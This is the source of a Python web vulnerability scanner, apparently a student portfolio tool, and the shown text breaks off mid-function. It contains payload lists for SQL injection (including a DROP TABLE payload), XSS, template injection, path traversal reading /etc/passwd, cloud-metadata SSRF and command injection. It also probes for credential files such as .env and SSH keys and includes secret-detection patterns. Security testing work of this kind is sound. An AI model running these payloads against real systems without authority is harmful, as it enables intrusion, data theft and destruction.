#!/usr/bin/env python3
"""
██████╗ ██╗  ██╗ █████╗ ███╗   ██╗████████╗ ██████╗ ███╗   ███╗
██╔══██╗██║  ██║██╔══██╗████╗  ██║╚══██╔══╝██╔═══██╗████╗ ████║
██████╔╝███████║███████║██╔██╗ ██║   ██║   ██║   ██║██╔████╔██║
██╔═══╝ ██╔══██║██╔══██║██║╚██╗██║   ██║   ██║   ██║██║╚██╔╝██║
██║     ██║  ██║██║  ██║██║ ╚████║   ██║   ╚██████╔╝██║ ╚═╝ ██║
╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝

PHANTOM v2.0 — Persistent Heuristic Attack & Network Threat Observation Machine
IIT Kanpur B.Cyber Portfolio Project | Authorized Testing Only
"""

# ══════════════════════════════════════════════════════════════════════════════
#  IMPORTS
# ══════════════════════════════════════════════════════════════════════════════
import asyncio, base64, json, re, socket, ssl, sys, threading, time, argparse
from collections import deque
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from datetime import datetime
from typing import Any, Optional
from urllib.parse import urljoin, urlparse, urlencode, parse_qsl, quote

import requests
from bs4 import BeautifulSoup
from rich import box
from rich.align import Align
from rich.console import Console
from rich.layout import Layout
from rich.live import Live
from rich.panel import Panel
from rich.progress import (BarColumn, Progress, SpinnerColumn,
                           TaskProgressColumn, TextColumn, TimeElapsedColumn)
from rich.rule import Rule
from rich.syntax import Syntax
from rich.table import Table
from rich.text import Text
from rich.tree import Tree

try:
    import dns.resolver, dns.query, dns.zone
    DNS_AVAILABLE = True
except ImportError:
    DNS_AVAILABLE = False

try:
    import whois as whois_lib
    WHOIS_AVAILABLE = True
except ImportError:
    WHOIS_AVAILABLE = False

try:
    requests.packages.urllib3.disable_warnings()
except Exception:
    pass

# ══════════════════════════════════════════════════════════════════════════════
#  CONFIGURATION
# ══════════════════════════════════════════════════════════════════════════════
MAX_THREADS     = 20
PORT_TIMEOUT    = 1.0
REQUEST_TIMEOUT = 10
CRAWL_DEPTH     = 3
MAX_URLS        = 200
REQUEST_DELAY   = 0.1
SCANNER_VERSION = "2.0"

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 "
    "(KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Edge/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) "
    "AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1",
]

# ══════════════════════════════════════════════════════════════════════════════
#  CONSTANTS — PAYLOADS & PATTERNS
# ══════════════════════════════════════════════════════════════════════════════

# ── SQL Injection ─────────────────────────────────────────────────────────────
SQL_PAYLOADS = [
    # Error-based
    "'", '"', "''", "\\", "\\\\",
    "' OR '1'='1", "' OR 1=1--", "' OR 1=1#",
    "\" OR \"1\"=\"1", "\" OR 1=1--",
    "admin'--", "admin'#", "') OR ('1'='1",
    # Union-based
    "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT 1,2,3--",
    "1' UNION SELECT version(),NULL--",
    "1' UNION SELECT database(),NULL--",
    # Order-by column enum
    "1' ORDER BY 1--+", "1' ORDER BY 2--+", "1' ORDER BY 3--+",
    "1' ORDER BY 100--+",
    # Boolean-blind
    "1 AND 1=1", "1 AND 1=2",
    "' AND '1'='1", "' AND '1'='2",
    "1' AND 1=1--", "1' AND 1=2--",
    # Time-blind
    "' AND SLEEP(3)--", "1; WAITFOR DELAY '0:0:3'--",
    "'; SELECT pg_sleep(3)--",
    "' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--",
    # Error-based extraction
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,DATABASE()))--",
    "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(VERSION(),"
    "FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    # Stacked
    "'; DROP TABLE users--", "'; SELECT SLEEP(3)--",
    # Encoded
    "%27", "1%27 OR 1=1", "%27 OR %271%27=%271",
    # Oracle
    "' OR 1=1--", "' OR '1'='1' --",
    # Special
    "' GROUP BY columnnames having 1=1--",
    "' HAVING 1=1--",
]

SQL_ERROR_PATTERNS = [
    r"sql syntax.*mysql", r"warning.*mysql_",
    r"you have an error in your sql syntax",
    r"check the manual that corresponds to your (mysql|mariadb)",
    r"unclosed quotation mark after the character string",
    r"quoted string not properly terminated",
    r"microsoft ole db provider for (odbc|sql)",
    r"pg_exec\(\)", r"pg_query\(",
    r"ora-\d{5}", r"oracle error",
    r"sqlite_.*error", r"error.*sqlite",
    r"sql server.*driver", r"\[sql server\]", r"mssql_query\(",
    r"syntax error.*in query expression",
    r"data type mismatch in criteria expression",
    r"invalid column name", r"unknown column",
    r"right syntax to use near", r"column count doesn",
    r"warning.*sybase", r"db2 sql error",
    r"conversion failed when converting",
]

# ── XSS ───────────────────────────────────────────────────────────────────────
XSS_PAYLOADS = [
    # Basic
    '<script>alert("PHANTOM-XSS")</script>',
    '<script>alert(1)</script>',
    '"><script>alert(1)</script>',
    "'><script>alert(1)</script>",
    '"><script>alert(document.domain)</script>',
    # Event handlers
    '<img src=x onerror=alert(1)>',
    '"><img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '<svg/onload=alert(1)>',
    '<details open ontoggle=alert(1)>',
    '<input autofocus onfocus=alert(1)>',
    '<marquee onstart=alert(1)>',
    # Attribute injection
    '" onmouseover="alert(1)',
    "' onmouseover='alert(1)",
    # JS context
    "';alert(1)//", '";alert(1)//',
    # iframe / URI
    '<iframe src=javascript:alert(1)>',
    'javascript:alert(1)',
    # Filter bypasses
    '<ScRiPt>alert(1)</ScRiPt>',
    '<script>alert`1`</script>',
    '<%2fscript><script>alert(1)</script>',
    # CSS
    '</style><script>alert(1)</script>',
    # SSTI markers (Server-Side Template Injection)
    '{{7*7}}', '${7*7}', '#{7*7}', '<%= 7*7 %>',
    '{{config}}', '{{self.__class__.__mro__}}',
]

# ── LFI ───────────────────────────────────────────────────────────────────────
LFI_PAYLOADS = [
    # Linux
    "../../../../etc/passwd",
    "../../../etc/passwd",
    "../../etc/passwd",
    "../etc/passwd",
    "../../../../etc/passwd%00",
    "....//....//....//etc/passwd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "%252e%252e%252f%252e%252e%252fetc%252fpasswd",
    # PHP wrappers (detection only, not RCE)
    "php://filter/convert.base64-encode/resource=index.php",
    "php://filter/read=string.rot13/resource=index.php",
    "php://filter/convert.base64-encode/resource=config.php",
    # Windows
    "../../../../windows/win.ini",
    "../../../../windows/system32/drivers/etc/hosts",
    "..\\..\\..\\..\\windows\\win.ini",
    # Null byte
    "../../../../etc/passwd\x00.jpg",
    # Double encoding
    "..%252F..%252F..%252Fetc%252Fpasswd",
]

LFI_INDICATORS = [
    "root:x:", "bin:x:", "daemon:x:", "nobody:x:",
    "[extensions]", "[fonts]", "[mci extensions]",
    "localhost\t127", "\\\\[boot loader\\\\]",
]

LFI_FILE_PARAMS = [
    "file", "page", "path", "include", "load", "template",
    "view", "lang", "doc", "read", "open", "src", "url",
    "dir", "folder", "content", "module", "conf",
]

# ── SSRF ──────────────────────────────────────────────────────────────────────
SSRF_PARAMS = [
    "url", "path", "host", "endpoint", "redirect", "src",
    "fetch", "load", "proxy", "forward", "href", "dest",
    "uri", "link", "site", "target", "callback", "return",
]

SSRF_PAYLOADS = [
    "http://169.254.169.254/latest/meta-data/",        # AWS IMDSv1
    "http://169.254.169.254/latest/meta-data/iam/",    # AWS IAM roles
    "http://metadata.google.internal/computeMetadata/v1/", # GCP
    "http://169.254.169.254/metadata/instance",        # Azure
    "http://100.100.100.200/latest/meta-data/",        # Alibaba
    "http://localhost/",
    "http://127.0.0.1/",
    "http://0.0.0.0/",
    "http://[::1]/",
    "file:///etc/passwd",
    "dict://localhost:6379/INFO",
    "http://localhost:6379/",
    "http://localhost:27017/",
    "http://localhost:9200/_cat/indices",
    "http://localhost:3306/",
]

# ── Sensitive Files ────────────────────────────────────────────────────────────
SENSITIVE_PATHS = [
    "/.env", "/.env.local", "/.env.backup", "/.env.prod",
    "/.env.dev", "/.env.staging", "/.env.example",
    "/.git/config", "/.git/HEAD", "/.git/COMMIT_EDITMSG",
    "/.git/index", "/.git/FETCH_HEAD",
    "/config.php", "/wp-config.php", "/configuration.php",
    "/config.yml", "/config.yaml", "/config.json",
    "/database.yml", "/db.php", "/database.php",
    "/secrets.yml", "/credentials.yml", "/application.yml",
    "/.htaccess", "/.htpasswd", "/web.config", "/.user.ini",
    "/phpinfo.php", "/info.php", "/test.php", "/php.php",
    "/backup.sql", "/dump.sql", "/db.sql", "/database.sql",
    "/backup.zip", "/backup.tar.gz", "/site.zip",
    "/robots.txt", "/sitemap.xml", "/crossdomain.xml",
    "/xmlrpc.php", "/wp-login.php",
    "/composer.json", "/composer.lock", "/package.json",
    "/server-status", "/server-info", "/.DS_Store",
    "/swagger.json", "/openapi.json", "/api-docs",
    "/graphql", "/graphiql", "/__debug__/",
    "/actuator/health", "/actuator/env", "/actuator/beans",
    "/actuator/mappings", "/actuator/info",
    "/_ah/admin", "/jmx-console", "/admin-console",
    "/console", "/manager/html",
    "/.bash_history", "/.ssh/id_rsa",
    "/readme.md", "/CHANGELOG.md",
]

ADMIN_PATHS = [
    "/admin", "/admin/", "/administrator", "/wp-admin",
    "/phpmyadmin", "/pma/", "/dashboard", "/panel",
    "/manage", "/backend", "/cms",
    "/login", "/signin", "/user/login",
    "/cpanel", "/webmin",
]

# ── Command Injection ─────────────────────────────────────────────────────────
CMD_PAYLOADS = [
    "; id",  "| id",  "` id`",  "$(id)",
    "; whoami", "| whoami",
    "; cat /etc/passwd",
    "; sleep 3", "| sleep 3", "` sleep 3`", "$(sleep 3)",
    "& ping -c 3 127.0.0.1",
    "; ls -la", "| ls -la",
    "& dir", "& ipconfig",
    "; echo PHANTOM_CMD_INJECTION_PROOF",
]

CMD_INDICATORS = [
    "uid=", "gid=", "groups=",
    "root:", "daemon:", "bin:",
    "total ", "drwxr", "drwx",
    "PHANTOM_CMD_INJECTION_PROOF",
    "Volume in drive", "Directory of",
]

# ── Open Redirect ─────────────────────────────────────────────────────────────
REDIRECT_PARAMS = [
    "redirect", "url", "next", "return", "returnTo",
    "return_url", "redirect_url", "goto", "target",
    "redir", "destination", "dest", "to", "link",
    "forward", "continue", "callback", "back",
]

REDIRECT_PAYLOADS = [
    "//evil-phantom-test.com",
    "https://evil-phantom-test.com",
    "///evil-phantom-test.com",
    "/\\/evil-phantom-test.com",
    "https:evil-phantom-test.com",
    "javascript:alert(1)",
    "//google.com",
]

# ── API Key Patterns ──────────────────────────────────────────────────────────
API_KEY_PATTERNS = {
    "AWS Access Key":    r"AKIA[0-9A-Z]{16}",
    "AWS Secret Key":    r"(?i)aws.*secret.*=.*[0-9a-zA-Z/+]{40}",
    "Google API Key":    r"AIza[0-9A-Za-z\-_]{35}",
    "GitHub Token":      r"ghp_[a-zA-Z0-9]{36}",
    "GitHub OAuth":      r"gho_[a-zA-Z0-9]{36}",
    "Stripe Live Key":   r"sk_live_[0-9a-zA-Z]{24}",
    "Stripe Test Key":   r"sk_test_[0-9a-zA-Z]{24}",
    "Slack Token":       r"xoxb-[0-9]+-[0-9]+-[a-zA-Z0-9]+",
    "SendGrid Key":      r"SG\.[a-zA-Z0-9\-_]{22}\.[a-zA-Z0-9\-_]{43}",
    "Twilio SID":        r"SK[0-9a-fA-F]{32}",
    "JWT Token":         r"eyJ[A-Za-z0-9\-_=]+\.[A-Za-z0-9\-_=]+\.?[A-Za-z0-9\-_.+/=]*",
    "Private RSA Key":   r"-----BEGIN (RSA |EC )?PRIVATE KEY-----",
    "Generic Secret":    r"(?i)(password|secret|token|api_key|apikey|passwd)\s*[=:]\s*['\"]([^'\"]{8,})['\"]",
    "DB Password":       r"(?i)(DB_PASSWORD|DATABASE_PASSWORD|DB_PASS)\s*=\s*\S+",
}

# ── Security Headers ──────────────────────────────────────────────────────────
SECURITY_HEADERS = {
    "X-Frame-Options":              ("HIGH",   "Prevents Clickjacking", "DENY or SAMEORIGIN"),
    "X-XSS-Protection":             ("MEDIUM", "Browser XSS filter",    "1; mode=block"),
    "X-Content-Type-Options":       ("MEDIUM", "MIME sniffing block",   "nosniff"),
    "Strict-Transport-Security":    ("HIGH",   "Forces HTTPS (HSTS)",   "max-age=31536000; includeSubDomains"),
    "Content-Security-Policy":      ("HIGH",   "XSS / injection policy","default-src 'self'"),
    "Referrer-Policy":              ("LOW",    "Referrer control",      "strict-origin-when-cross-origin"),
    "Permissions-Policy":           ("LOW",    "Browser feature control","geolocation=(), microphone=()"),
    "Expect-CT":                    ("LOW",    "Cert transparency",     "max-age=86400, enforce"),
    "Cross-Origin-Opener-Policy":   ("MEDIUM", "Cross-origin isolation","same-origin"),
    "Cross-Origin-Embedder-Policy": ("MEDIUM", "Embedding restriction", "require-corp"),
    "Cross-Origin-Resource-Policy": ("MEDIUM", "Resource access ctrl",  "same-origin"),
}

# ── Ports & Services ──────────────────────────────────────────────────────────
TOP_1000_PORTS = [
    21,22,23,25,53,80,110,111,119,135,139,143,194,443,445,
    465,514,587,631,993,995,1080,1194,1433,1521,1723,1883,
    2049,2121,2222,2375,2376,3000,3306,3389,3690,4000,4001,
    4444,4848,5000,5432,5672,5900,5984,6000,6379,6443,7000,
    7001,7070,7443,8000,8008,8009,8080,8081,8082,8083,8085,
    8088,8090,8161,8443,8444,8500,8600,8761,8888,9000,9001,
    9090,9091,9092,9200,9300,9418,9443,10000,11211,15672,
    16010,27017,28017,50000,50070,61616,
]

DANGEROUS_SERVICES = {
    "Telnet":          ("CRITICAL", "Unencrypted auth — sniffable",     "CVE-generic"),
    "Redis":           ("HIGH",     "No auth by default — data exposed", "CVE-2022-0543"),
    "Elasticsearch":   ("HIGH",     "Unauthenticated data access",       "CVE-2021-22145"),
    "MongoDB":         ("HIGH",     "No auth in older versions",          "CVE-2017-14529"),
    "Memcached":       ("MEDIUM",   "No auth, amplification risk",        "CVE-2018-1000115"),
    "Jupyter":         ("CRITICAL", "Direct RCE if no password",          "CVE-2021-32797"),
    "FTP":             ("MEDIUM",   "May allow anon access",              "CVE-generic"),
    "SMTP":            ("LOW",      "Open relay potential",               "CVE-generic"),
    "RDP":             ("HIGH",     "BlueKeep / DejaBlue risk",           "CVE-2019-0708"),
    "SMB":             ("CRITICAL", "EternalBlue / WannaCry risk",        "CVE-2017-0144"),
}

# ── CVE Version Checks ─────────────────────────────────────────────────────────
VERSION_CVE_MAP = {
    "OpenSSH": [
        (lambda v: v < (7, 4), "CVE-2016-6515 - DoS via auth before key exchange"),
        (lambda v: v < (8, 5), "CVE-2021-28041 - Double-free in ssh-agent"),
        (lambda v: v < (9, 6), "CVE-2023-51385 - OS cmd injection via shell metachar"),
    ],
    "Apache": [
        (lambda v: v < (2, 4, 51), "CVE-2021-41773 - Path traversal / RCE"),
        (lambda v: v < (2, 4, 56), "CVE-2023-25690 - HTTP request splitting"),
    ],
    "nginx": [
        (lambda v: v < (1, 21, 0), "CVE-2021-23017 - 1-byte buffer overwrite"),
        (lambda v: v < (1, 25, 3), "CVE-2023-44487 - HTTP/2 rapid reset DoS"),
    ],
}

# ── Vuln metadata ─────────────────────────────────────────────────────────────
VULN_META = {
    "SQL Injection": {
        "cvss": 9.8, "owasp": "A03:2021", "cwe": "CWE-89",
        "impact": "Full database compromise. Attacker can read all data, "
                  "modify records, drop tables, and escalate to OS RCE via INTO OUTFILE.",
        "fix": [
            "Use parameterized queries: cursor.execute('SELECT * FROM t WHERE id=%s', (id,))",
            "Apply input whitelist validation before any DB operation",
            "Enforce least-privilege DB user (SELECT only where applicable)",
            "Enable MySQL general_log for audit trail of all queries",
        ],
    },
    "Reflected XSS": {
        "cvss": 6.1, "owasp": "A03:2021", "cwe": "CWE-79",
        "impact": "Session hijacking, credential theft, defacement, "
                  "keylogger injection, phishing overlay on legitimate site.",
        "fix": [
            "HTML-encode all output: htmlspecialchars($val, ENT_QUOTES, 'UTF-8')",
            "Implement strict Content-Security-Policy header",
            "Use framework-level auto-escaping (Jinja2 autoescaping, React JSX)",
            "Validate and sanitize all user inputs server-side",
        ],
    },
    "SSTI": {
        "cvss": 9.0, "owasp": "A03:2021", "cwe": "CWE-94",
        "impact": "Remote code execution via template engine. Attacker can "
                  "execute arbitrary OS commands, read files, pivot to other systems.",
        "fix": [
            "Never pass raw user input to template.render() functions",
            "Use sandboxed template environments (Jinja2 SandboxedEnvironment)",
            "Whitelist allowed template variables strictly",
        ],
    },
    "LFI": {
        "cvss": 7.5, "owasp": "A01:2021", "cwe": "CWE-22",
        "impact": "Read sensitive server files (/etc/passwd, config files, "
                  "private keys). Can chain to RCE via log poisoning.",
        "fix": [
            "Never pass user input directly to file system functions",
            "Use a whitelist of allowed file names/paths",
            "realpath() + str_starts_with() to validate base directory",
            "Disable allow_url_include and allow_url_fopen in php.ini",
        ],
    },
    "SSRF": {
        "cvss": 8.6, "owasp": "A10:2021", "cwe": "CWE-918",
        "impact": "Access cloud metadata (AWS keys), internal services, "
                  "bypass firewalls, pivot to internal network.",
        "fix": [
            "Whitelist allowed domains/IPs for outbound requests",
            "Block RFC 1918 and link-local addresses at network level",
            "Use cloud IMDS v2 (requires token — not accessible via SSRF)",
            "Disable URL fetch if not required by application",
        ],
    },
    "CORS Misconfiguration": {
        "cvss": 8.1, "owasp": "A05:2021", "cwe": "CWE-942",
        "impact": "Any evil.com can make authenticated API calls on behalf "
                  "of logged-in users, stealing session data and PII.",
        "fix": [
            "Set Access-Control-Allow-Origin to explicit trusted domain list",
            "Never reflect request Origin header without validation",
            "Avoid Access-Control-Allow-Credentials: true with wildcard origin",
        ],
    },
    "Sensitive File Exposed": {
        "cvss": 7.5, "owasp": "A05:2021", "cwe": "CWE-538",
        "impact": "Credentials, API keys, DB passwords, source code exposed. "
                  "Direct path to full system compromise.",
        "fix": [
            "Move sensitive files outside webroot entirely",
            "Block access via .htaccess: Deny from all",
            "Audit web server config to restrict file access",
            "Add .git, .env to .gitignore and never commit secrets",
        ],
    },
    "Missing Security Header": {
        "cvss": 4.3, "owasp": "A05:2021", "cwe": "CWE-1021",
        "impact": "Enables clickjacking, MIME sniffing, XSS, downgrade attacks.",
        "fix": [
            "Add headers in Apache: Header always set X-Frame-Options DENY",
            "Nginx: add_header X-Frame-Options DENY;",
            "Express.js: use helmet() middleware",
        ],
    },
    "Command Injection": {
        "cvss": 9.8, "owasp": "A03:2021", "cwe": "CWE-78",
        "impact": "Full OS command execution as web server user. "
                  "File read/write, reverse shell, lateral movement.",
        "fix": [
            "Never pass user input to shell_exec, system, exec",
            "Use subprocess with argument list (not shell=True)",
            "Validate input against strict whitelist",
        ],
    },
    "Open Redirect": {
        "cvss": 6.1, "owasp": "A01:2021", "cwe": "CWE-601",
        "impact": "Phishing attacks using trusted domain name. "
                  "OAuth token theft via redirect_uri manipulation.",
        "fix": [
            "Whitelist allowed redirect destinations",
            "Never redirect to user-supplied URLs",
            "Validate URL starts with known safe path before redirect",
        ],
    },
    "Insecure Cookie": {
        "cvss": 5.3, "owasp": "A07:2021", "cwe": "CWE-614",
        "impact": "Session token stolen over HTTP, via XSS, or via CSRF.",
        "fix": [
            "Set-Cookie: session=val; Secure; HttpOnly; SameSite=Strict",
            "Verify SameSite=Strict blocks CSRF for all state-changing requests",
        ],
    },
    "Clickjacking": {
        "cvss": 6.5, "owasp": "A05:2021", "cwe": "CWE-1021",
        "impact": "UI redressing — trick users into clicking hidden buttons, "
                  "enabling mic/cam, making purchases.",
        "fix": [
            "Add header: X-Frame-Options: DENY",
            "OR: Content-Security-Policy: frame-ancestors 'none'",
        ],
    },
    "IDOR": {
        "cvss": 7.5, "owasp": "A01:2021", "cwe": "CWE-284",
        "impact": "Access other users' data by changing ID in URL. "
                  "Horizontal and vertical privilege escalation.",
        "fix": [
            "Enforce server-side authorization on every object access",
            "Use unpredictable UUIDs instead of sequential integers",
            "Never rely on client-supplied IDs without ownership validation",
        ],
    },
    "API Key Exposed": {
        "cvss": 9.1, "owasp": "A02:2021", "cwe": "CWE-312",
        "impact": "Direct access to external service (AWS, Stripe, GitHub). "
                  "Financial fraud, data theft, resource abuse.",
        "fix": [
            "Immediately rotate exposed key in provider console",
            "Use environment variables — never hardcode in source",
            "Scan repo with trufflehog/gitleaks before each commit",
        ],
    },
}

# ══════════════════════════════════════════════════════════════════════════════
#  DATA STRUCTURES
# ══════════════════════════════════════════════════════════════════════════════

@dataclass
class Finding:
    """Represents a single discovered vulnerability or security issue."""
    vuln_id:    str
    type:       str
    severity:   str          # CRITICAL / HIGH / MEDIUM / LOW / INFO
    location:   str
    parameter:  str  = ""
    payload:    str  = ""
    evidence:   str  = ""
    extracted:  dict = field(default_factory=dict)
    cvss:       float = 0.0
    owasp:      str  = ""
    cwe:        str  = ""
    impact:     str  = ""
    fix:        list = field(default_factory=list)
    chain_type: str  = ""    # What the ChainEngine triggered this from


@dataclass
class ScanState:
    """Thread-safe shared state across all scanner components."""
    target:          str
    base_url:        str
    start_time:      float           = field(default_factory=time.time)
    findings:        list            = field(default_factory=list)
    open_ports:      list            = field(default_factory=list)
    discovered_urls: set             = field(default_factory=set)
    js_files:        set             = field(default_factory=set)
    forms:           list            = field(default_factory=list)
    secrets:         list            = field(default_factory=list)
    waf_detected:    Optional[str]   = None
    scan_complete:   bool            = False
    interrupted:     bool            = False
    _lock:           threading.Lock  = field(default_factory=threading.Lock)
    _vuln_counter:   int             = 0

    def add_finding(self, f: Finding) -> None:
        with self._lock:
            self._vuln_counter += 1
            f.vuln_id = f"VULN-{self._vuln_counter:03d}"
            self.findings.append(f)

    def counts(self) -> dict:
        with self._lock:
            c = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0, "INFO": 0}
            for f in self.findings:
                c[f.severity] = c.get(f.severity, 0) + 1
            return c


# ══════════════════════════════════════════════════════════════════════════════
#  UI MANAGER
# ══════════════════════════════════════════════════════════════════════════════

class UIManager:
    """Manages all Rich live display output — zero plain print() calls."""

    BANNER = """[bold red]
██████╗ ██╗  ██╗ █████╗ ███╗   ██╗████████╗ ██████╗ ███╗   ███╗
██╔══██╗██║  ██║██╔══██╗████╗  ██║╚══██╔══╝██╔═══██╗████╗ ████║
██████╔╝███████║███████║██╔██╗ ██║   ██║   ██║   ██║██╔████╔██║
██╔═══╝ ██╔══██║██╔══██║██║╚██╗██║   ██║   ██║   ██║██║╚██╔╝██║
██║     ██║  ██║██║  ██║██║ ╚████║   ██║   ╚██████╔╝██║ ╚═╝ ██║
╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝[/bold red]
[bold cyan]        Persistent Heuristic Attack & Network Threat Observation Machine[/bold cyan]
[yellow]        v{ver}  |  IIT Kanpur B.Cyber Portfolio  |  Authorized Testing Only[/yellow]"""

    SEV_COLORS = {
        "CRITICAL": "bold red",
        "HIGH":     "bold yellow",
        "MEDIUM":   "bold cyan",
        "LOW":      "bold green",
        "INFO":     "dim white",
    }

    def __init__(self):
        self.console = Console()
        self._log:   deque = deque(maxlen=22)
        self._phase_progress: dict = {}
        self._state: Optional[ScanState] = None
        self._lock = threading.Lock()
        self._current_phase = ""

    def print_banner(self, target: str) -> None:
        self.console.print(Text.from_markup(
            self.BANNER.format(ver=SCANNER_VERSION)
        ))
        self.console.print(Rule(style="red"))
        info = Table(show_header=False, box=box.SIMPLE, padding=(0, 2))
        info.add_column(style="cyan")
        info.add_column(style="white")
        info.add_row("Target",     target)
        info.add_row("Started",    datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
        info.add_row("Scanner",    f"PHANTOM v{SCANNER_VERSION}")
        info.add_row("Warning",    "[red]AUTHORIZED TARGETS ONLY — IT Act 2000, Sec 66[/red]")
        self.console.print(Panel(info, title="[bold cyan]◈  TARGET INFO[/bold cyan]",
                                 border_style="cyan"))

    def set_state(self, state: ScanState) -> None:
        self._state = state

    def log(self, msg: str, level: str = "INFO") -> None:
        ts  = datetime.now().strftime("%H:%M:%S")
        color_map = {
            "INFO": "white", "OK": "green", "VULN": "bold red",
            "WARN": "yellow", "SKIP": "dim", "CHAIN": "bold magenta",
        }
        color = color_map.get(level, "white")
        icon  = {"INFO": "◦", "OK": "✓", "VULN": "★", "WARN": "⚠",
                 "SKIP": "–", "CHAIN": "⛓"}.get(level, "◦")
        with self._lock:
            self._log.append(f"[dim][{ts}][/dim] [{color}]{icon} {msg}[/{color}]")

    def set_phase(self, name: str, total: int) -> None:
        with self._lock:
            self._phase_progress[name] = {"done": 0, "total": total}
            self._current_phase = name

    def advance_phase(self, name: str, by: int = 1) -> None:
        with self._lock:
            if name in self._phase_progress:
                self._phase_progress[name]["done"] = min(
                    self._phase_progress[name]["done"] + by,
                    self._phase_progress[name]["total"]
                )

    def get_layout(self) -> Layout:
        layout = Layout()
        layout.split_column(
            Layout(self._build_phases_log_row(), name="main", ratio=1),
            Layout(self._build_counter_bar(),    name="bottom", size=5),
        )
        return layout

    def _build_phases_log_row(self) -> Panel:
        phases_table = Table(box=None, show_header=False,
                             padding=(0, 1), expand=True)
        phases_table.add_column("Phase", style="cyan", width=24)
        phases_table.add_column("Bar",   ratio=1)
        phases_table.add_column("%",     style="bold white", width=5)

        with self._lock:
            phases = dict(self._phase_progress)
            current = self._current_phase

        for name, info in phases.items():
            done, total = info["done"], max(info["total"], 1)
            pct   = int((done / total) * 100)
            n_fill = int((done / total) * 20)
            bar    = f"[green]{'█' * n_fill}[/green][dim]{'░' * (20 - n_fill)}[/dim]"
            style  = "bold cyan" if name == current else "dim"
            phases_table.add_row(f"[{style}]{name}[/{style}]", bar, f"[{style}]{pct}%[/{style}]")

        phases_panel = Panel(phases_table,
                             title="[bold cyan]◈  SCAN PHASES[/bold cyan]",
                             border_style="blue", padding=(0, 1))

        log_text = Text()
        with self._lock:
            lines = list(self._log)
        for line in lines:
            log_text.append_text(Text.from_markup(line))
            log_text.append("\n")

        log_panel = Panel(log_text, title="[bold cyan]◈  LIVE ACTIVITY[/bold cyan]",
                          border_style="blue", padding=(0, 1))

        combined = Table(box=None, show_header=False, expand=True, padding=0)
        combined.add_column(ratio=1)
        combined.add_column(ratio=2)
        combined.add_row(phases_panel, log_panel)
        return combined

    def _build_counter_bar(self) -> Panel:
        counts = self._state.counts() if self._state else \
                 {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0}
        total  = sum(counts.values())
        t = Table(box=None, show_header=False, expand=True, padding=(0, 2))
        t.add_column()
        cells = []
        for sev, cnt in counts.items():
            color = self.SEV_COLORS.get(sev, "white")
            cells.append(f"[{color}]{sev}: {cnt}[/{color}]  ")
        cells.append(f"[bold white]TOTAL: {total}[/bold white]")
        t.add_row("  ".join(cells))
        return Panel(t, title="[bold cyan]◈  VULNERABILITIES[/bold cyan]",
                     border_style="red", padding=(0, 1))


# ══════════════════════════════════════════════════════════════════════════════
#  PORT SCANNER
# ══════════════════════════════════════════════════════════════════════════════

class PortScanner:
    """Async socket-based port scanner with banner grabbing and CVE detection."""

    def __init__(self, host: str, ui: UIManager):
        self.host = host
        self.ui   = ui

    async def _check_port(self, port: int, sem: asyncio.Semaphore) -> Optional[dict]:
        async with sem:
            try:
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(self.host, port), timeout=PORT_TIMEOUT
                )
                banner = ""
                try:
                    if port in (80, 8080, 8000, 8008):
                        writer.write(b"HEAD / HTTP/1.0\r\nHost: " +
                                     self.host.encode() + b"\r\n\r\n")
                        await writer.drain()
                    elif port == 21:
                        pass  # FTP sends banner on connect
                    elif port == 22:
                        pass  # SSH sends banner on connect
                    elif port == 25:
                        writer.write(b"EHLO phantom.test\r\n")
                        await writer.drain()
                    data   = await asyncio.wait_for(reader.read(512), timeout=2.0)
                    banner = data.decode("utf-8", errors="ignore").strip()[:120]
                except Exception:
                    pass
                writer.close()
                try:
                    await writer.wait_closed()
                except Exception:
                    pass
                return {"port": port, "banner": banner}
            except Exception:
                return None

    async def scan_async(self, ports: list) -> list:
        sem    = asyncio.Semaphore(100)
        tasks  = [self._check_port(p, sem) for p in ports]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        return [r for r in results if r and isinstance(r, dict)]

    def detect_service(self, port: int, banner: str) -> dict:
        """Identify service, version, and CVEs from port + banner."""
        svc     = ""
        version = ""
        cves    = []

        port_map = {
            21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP",
            53: "DNS", 80: "HTTP", 110: "POP3", 143: "IMAP",
            443: "HTTPS", 445: "SMB", 1433: "MSSQL", 3306: "MySQL",
            3389: "RDP", 5432: "PostgreSQL", 6379: "Redis",
            8080: "HTTP-Alt", 8443: "HTTPS-Alt", 9200: "Elasticsearch",
            27017: "MongoDB", 11211: "Memcached", 8888: "Jupyter",
        }
        svc = port_map.get(port, f"Port-{port}")

        # Version extraction via banner regex
        patterns = [
